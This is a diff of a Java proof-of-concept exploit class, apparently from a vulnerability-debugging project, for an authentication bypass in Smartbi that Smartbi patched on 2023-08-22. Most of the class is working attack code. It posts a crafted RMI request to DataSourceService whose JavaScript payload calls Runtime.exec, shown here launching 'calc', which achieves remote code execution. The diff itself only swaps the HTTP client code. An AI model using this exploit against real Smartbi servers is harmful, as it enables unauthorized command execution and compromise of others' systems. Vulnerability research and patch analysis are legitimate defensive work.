@@ -1,23 +1,26 @@
 package cve;
 
+import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
+import com.pacemrc.vuldebug.common.utils.http.Response;
 import org.apache.http.HttpEntity;
-import org.apache.http.HttpHost;
-import org.apache.http.HttpResponse;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.config.RequestConfig;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.ContentType;
 import org.apache.http.entity.mime.MultipartEntityBuilder;
 import org.apache.http.entity.mime.content.StringBody;
-import org.apache.http.impl.client.HttpClientBuilder;
-import org.apache.http.util.EntityUtils;
 
 import java.io.IOException;
 import java.net.URLEncoder;
-import java.nio.charset.StandardCharsets;
 
 /**
- * 登陆逻辑漏洞
+ * 漏洞：
+ * https://www.smartbi.com.cn/patchinfo
+ * 2023-08-22  修复某种特定情况下登录与权限验证漏洞
+ *
+ * 关键调试类和方法：
+ * smartbi.freequery.filter.CheckIsLoggedFilter#doFilter
+ * smartbi.util.FilterUtil#needToCheck
+ * smartbi.framework.rmi.RMIServlet#doPost
+ * smartbi.freequery.client.datasource.DataSourceService#getJavaQueryDataParamsAndFields
  */
 public class PATCH_20230822 {
 
@@ -28,14 +31,8 @@ public class PATCH_20230822 {
         queryString = "className=UserService&methodName=checkVersion&params=[]";
         queryString = URLEncoder.encode(queryString,"UTF-8");
 
-        HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();
-
-        HttpHost proxy = new HttpHost("127.0.0.1",8080);
-        RequestConfig config = RequestConfig.custom()
-                .setProxy(proxy)
-                .build();
-        httpClientBuilder.setDefaultRequestConfig(config);
-        HttpClient httpClient = httpClientBuilder.build();
+        HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
+        HttpPost httpPost = new HttpPost(url + queryString);
 
         MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder.create()
                 .addPart("className", new StringBody("DataSourceService", ContentType.TEXT_PLAIN))
@@ -43,14 +40,12 @@ public class PATCH_20230822 {
                 .addPart("params",new StringBody("[\"smartbi.JavaScriptJavaQuery\",{\"javaScript\":\"importClass(java.lang.Runtime);var runtime = Runtime.getRuntime();runtime.exec('calc');\"},\"AP_WARNING_STYLE_SETTING\"]", ContentType.TEXT_PLAIN));
         HttpEntity multipartEntity = multipartEntityBuilder.build();
 
-        HttpPost httpPost = new HttpPost(url + queryString);
         httpPost.setEntity(multipartEntity);
+        httpRequest.exec(httpPost);
+        Response response = httpRequest.getResponse();
+        System.out.println(response.getStatusCode());
+        System.out.println(response.getResponseBody());
 
-        HttpResponse response = httpClient.execute(httpPost);
-        HttpEntity responseEntity = response.getEntity();
-        String responseBody = responseEntity != null ? EntityUtils.toString(responseEntity, StandardCharsets.UTF_8) : null;
 
-        System.out.println("Response status code: " + response.getStatusLine().getStatusCode());
-        System.out.println("Response body: " + responseBody);
     }
 }
